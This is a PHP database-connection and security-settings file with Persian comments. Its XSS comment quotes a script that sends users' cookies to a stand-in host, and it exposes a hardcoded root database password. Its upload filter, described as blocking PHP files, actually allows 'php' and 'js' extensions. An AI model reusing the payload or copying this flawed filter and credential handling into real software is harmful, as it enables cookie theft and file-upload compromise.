<?php


//دستورات زیر نحوه بازیابی پایگاه داده از طریق خط فرمان می باشد
// d:
//cd D:\wamp\bin\mysql\mysql5.6.17\bin
//mysql -u root asakhnet < d:\asakhnet_invir.sql

$_server = "localhost";//نام سرور پایگاه داده
$_server_user = "root";//نام کاربری پایگاه داده
$_server_pass = "123?123qwe";//کلمه عبور پایگاه داده
$_server_db = "asakhnet_invir";// نام پایگاه داده
$_server_httptype = "http";//پروتکل اجرایی
$_server_domain_r1 = "ASAKH.KOAJ.IR";//دامنه اصلی


//my local
$_server_pass = "";
$_server_db = "asakhnet";

$con = mysql_connect($_server, $_server_user, $_server_pass);//اتصال به پایگاه داده
if (!$con) die('Could not connect: ' . mysql_error());//خطا در صورت عدم اتصال
mysql_select_db($_server_db, $con);//انتخاب پایگاه داده در صورت بر قراری اتصال
mysql_query('set names "utf8"', $con);//تعیین کاراکترست پایگاه داده




/*
جلوگیری از حمله 
SESSION Hijacking
با ۱ قرار دادن این تنظیم، دسترسی جاوا اسکریپت به کوکی ها رو از بین می بریم.
*/
ini_set( 'session.cookie_httponly', 1 );
ini_set( 'session.cookie_secure', 1 );//برای جلوگیری از شنود کوکی‌ها و انتقال امن آن، پرچم امن‌سازی کوکی  یک می شود
ini_set('display_errors', 'Off');//جهت جلوگیری از افشای اطلاعات سایت از طریق گزارش خطا ها

/*
جلوگیری از حمله
XSS 
در این نوع حمله نفوذگر اسکریپتهای جاوااسکریپت یا برچسب های
 HTML
 دلخواه خود را به صفحه قربانی تزریق کرده و این کدهای مخرب روی مرورگر کاربران دیگر سایت اجرا میشود.
 شخص نفوذگر توسط کد زیر می تواند به کوکی های تمامی کاربران دسترسی داشته باشد:
 <script>location.href="http://examplecom/save-cookie.php?data="+escape(document.cookie)</script> 
*/

foreach ($_POST as $key => $value)
 $_POST[$key]=htmlspecialchars($value);
 //echo htmlspecialchars($value)."<br>";
    

 
 

header("X-Frame-Options: DENY");
//جلوگیری از بارگذاری فایل های هکرها مانند پی اچ پی و محدود کردن فایل های آپلود شده
 $hasrow=0;
foreach ($_FILES as $key => $value)
{
    $filename = $_FILES[$key]['name'];
    if ($filename!='')
    {   
        $hasrow=1;
        $ext = pathinfo($filename, PATHINFO_EXTENSION);
        $allowed = array('zip','rar','jpeg','jpg','bmp','tif','png','gif','pdf','doc','docx','php','js','txt','xlsx','xls');
        $error =! in_array( strtolower($ext) , $allowed );  
    }  
}
if ($hasrow==1 && $error==1)
{
    //print $ext;
    //print $filename;
    echo "نوع فایل آپلود شده مجاز نمی باشد.<br> لیست فایل های مورد قبول:<br>";
    foreach ($allowed as $key => $value)
    print " $value ،";
    exit;
    
}




    
?>